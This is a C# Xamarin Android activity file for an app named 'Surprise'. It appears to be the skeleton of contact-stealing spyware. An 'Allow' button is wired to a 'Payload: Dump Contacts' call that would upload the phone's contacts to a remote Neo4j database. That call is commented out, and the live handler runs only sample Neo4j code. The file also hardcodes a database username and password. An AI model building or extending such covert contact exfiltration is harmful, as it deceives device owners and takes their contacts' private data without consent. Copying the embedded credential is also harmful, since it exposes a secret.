using Android.App;
using Android.OS;
using Android.Runtime;
using Android.Views;
using Android.Widget;
using AndroidX.AppCompat.App;

using System;
using System.IO;

namespace Surprise
{
    [Activity(Label = "@string/app_name", Theme = "@style/AppTheme.NoActionBar", MainLauncher = true)]
    public partial class MainActivity : AppCompatActivity
    {
        // [ Server Dredentials ]
        readonly string database_user = "neo4j";
        readonly string database_pass = "jo4PxjbDvU7nMLZSPPYTnOcXusihLdgWsbYE_khdxeo";

        // [ Temporary Paths ]
        string tempContactsPath = Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData), "contactsPath.txt");

        // [ Services ]
        ContactService_Android contactService_Android = new ContactService_Android();
        Payloads paylaods = new Payloads();
        Database database = new Database();

        protected override void OnCreate(Bundle savedInstanceState)
        {
            // [ Starting Point ]

            base.OnCreate(savedInstanceState);
            Xamarin.Essentials.Platform.Init(this, savedInstanceState);
            SetContentView(Resource.Layout.activity_main);

            // Set Main Button's Function
            FindViewById<Button>(Resource.Id.AllowButton).Click += AllowBTNOnClick;

            // Connecting to Database
            //while (database.Connect() != 0) ;
        }

        public override bool OnCreateOptionsMenu(IMenu menu)
        {
            MenuInflater.Inflate(Resource.Menu.menu_main, menu);
            return true;
        }

        // Mail Button CLick Event
        private async void AllowBTNOnClick(object sender, EventArgs eventArgs)
        {
            // [ Payload: Dump Contacts ]
            //paylaods.DumpContacts(this, contactService_Android, database, tempContactsPath, 2000);

            // Aura queries use an encrypted connection using the "neo4j+s" protocol
            var uri = "neo4j+s://<Bolt url for Neo4j Aura database>";

            var user = "<Username for Neo4j Aura database>";
            var password = "<Password for Neo4j Aura database>";

            using (var example = new DriverIntroductionExample(uri, user, password))
            {
                await example.CreateFriendship("Alice", "David");
            }
        }

        public override void OnRequestPermissionsResult(int requestCode, string[] permissions, [GeneratedEnum] Android.Content.PM.Permission[] grantResults)
        {
            Xamarin.Essentials.Platform.OnRequestPermissionsResult(requestCode, permissions, grantResults);

            base.OnRequestPermissionsResult(requestCode, permissions, grantResults);
        }
    }
}
